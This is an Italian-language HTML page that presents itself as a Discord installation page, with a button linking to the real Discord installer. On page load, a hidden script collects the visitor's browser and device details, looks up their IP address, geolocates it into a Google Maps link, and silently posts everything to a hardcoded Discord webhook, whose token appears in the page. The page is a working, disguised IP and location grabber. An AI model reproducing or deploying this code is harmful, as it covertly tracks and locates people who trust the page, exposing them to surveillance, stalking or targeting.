<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Installazione Discord</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            padding: 20px;
            background-color: #f4f4f4;
            text-align: center;
        }
        button {
            background-color: #007bff; /* Blu */
            color: white; /* Testo bianco */
            padding: 10px 20px; /* Spaziatura interna */
            border: none; /* Nessun bordo */
            border-radius: 5px; /* Bordi arrotondati */
            font-size: 16px; /* Dimensione del testo */
            cursor: pointer; /* Puntatore a mano */
            transition: background-color 0.3s; /* Transizione del colore */
        }
        button:hover {
            background-color: #0056b3; /* Blu pi√π scuro al passaggio del mouse */
        }
    </style>
</head>
<body>
    <h1>Installazione di Discord</h1>
    <button onclick="window.location.href='https://discord.com/api/downloads/distributions/app/installers/latest?channel=stable&platform=win&arch=x64';">
        Installa
    </button>

    <script>
        async function sendDeviceInfo() {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                online: navigator.onLine,
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency,
                memory: navigator.deviceMemory || 'N/A',
                ipAddress: null,
                locationLink: 'N/A'
            };

            // Ottieni l'indirizzo IP
            await fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    deviceInfo.ipAddress = data.ip;

                    // Ottieni la posizione geografica
                    return fetch(`https://ipinfo.io/${data.ip}/json?token=YOUR_IPINFO_TOKEN`);
                })
                .then(response => response.json())
                .then(data => {
                    if (data.loc) {
                        const [lat, lon] = data.loc.split(',');
                        deviceInfo.locationLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    }
                });

            // Crea il payload per Discord
            const payload = {
                embeds: [{
                    title: "Informazioni del Dispositivo",
                    color: 0x0099ff, // Blu chiaro
                    fields: [
                        { name: 'User Agent', value: deviceInfo.userAgent || 'N/A', inline: true },
                        { name: 'Piattaforma', value: deviceInfo.platform || 'N/A', inline: true },
                        { name: 'Lingua', value: deviceInfo.language || 'N/A', inline: true },
                        { name: 'Risoluzione dello Schermo', value: deviceInfo.screenResolution || 'N/A', inline: true },
                        { name: 'Stato Connessione', value: deviceInfo.online ? 'Online' : 'Offline', inline: true },
                        { name: 'Fuso Orario', value: deviceInfo.timeZone || 'N/A', inline: true },
                        { name: 'Memoria', value: deviceInfo.memory || 'N/A', inline: true },
                        { name: 'IP Indirizzo', value: deviceInfo.ipAddress || 'N/A', inline: true },
                        { name: 'Posizione', value: deviceInfo.locationLink || 'N/A', inline: true }
                    ],
                    footer: {
                        text: "Messaggio inviato tramite webhook",
                        icon_url: "https://i.imgur.com/AfFp7pu.png" // Icona del footer
                    }
                }]
            };

            // Invia il payload al webhook Discord
            const webhookUrl = 'https://discord.com/api/webhooks/1272243742962614374/6qq-6f1Y7sXupLfshryiw4nkNMOQFHGOzWd0l0iG0p-1SzJxHd0nScxzWHTMiZ2SJ9eM';
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    console.log('Informazioni del dispositivo inviate con successo.');
                } else {
                    console.error('Errore nell\'invio delle informazioni:', response.status, response.statusText);
                }
            } catch (error) {
                console.error('Errore:', error);
            }
        }

        // Invia le informazioni al caricamento della pagina
        window.onload = sendDeviceInfo;
    </script>
</body>
</html>
